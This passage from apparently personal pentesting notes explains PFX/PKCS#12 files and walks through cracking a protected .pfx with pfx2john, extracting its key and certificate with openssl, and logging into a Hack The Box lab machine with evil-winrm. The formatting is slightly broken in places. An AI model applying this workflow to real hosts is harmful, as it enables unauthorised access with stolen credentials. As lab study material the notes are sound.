  private/public keys and certificates.

# PFX file

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

A .pfx file also known as PKCS#12 certificate or .p12 file format can contain certificates in different formats, including .cert, .crt, and .pem. It allows you to securely transfer the certificate and its private key from one computer to another.&#x20;

### Components

PFX files are made of several components

* Private keys&#x20;
* Public keys
* Certificates

### Opening .pfx file

It possible to crack password protected .pfx files with john.                                                                                       &#x20;

```bash
# Use pfxjohn to get hash
$ pfx2john /home/kali/Downloads/legacyy_dev_auth.pfx > winrm.pfx

Knowing the password it is then possible using openssl to extract the private key and save it as a new .key file. The command will for this is:

### Dumping private key

* Use PKCS#12 format  ([https://en.wikipedia.org/wiki/PKCS\_12](https://en.wikipedia.org/wiki/PKCS_12))
* Exclude certificates from output

```bash
# Extract private key
â”€$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.pfx.key-enc                                                                                       
Enter Import Password:                                                                                     
Enter PEM pass phrase:                                                                                     
Verifying - Enter PEM pass phrase: 
```

After this we dump the certificate:

```bash
# Dump certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy_dev_auth.crt
```

#### Using the key and certificate

Having cracked the .pfx file and extracted the private key and certificate one of the possibilities to use them is WinRm. Commonly used by WinRM is port 5986.&#x20;

* -c    certificate file
* -k    key file
* -S   enable SSL

{% hint style="info" %}
We enable SSL because port 5986 was open which is HTTPS. Port 5985 is HTTP.
{% endhint %}

Finally we connect using evil-winrm

```bash
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt

Evil-WinRM shell v3.6
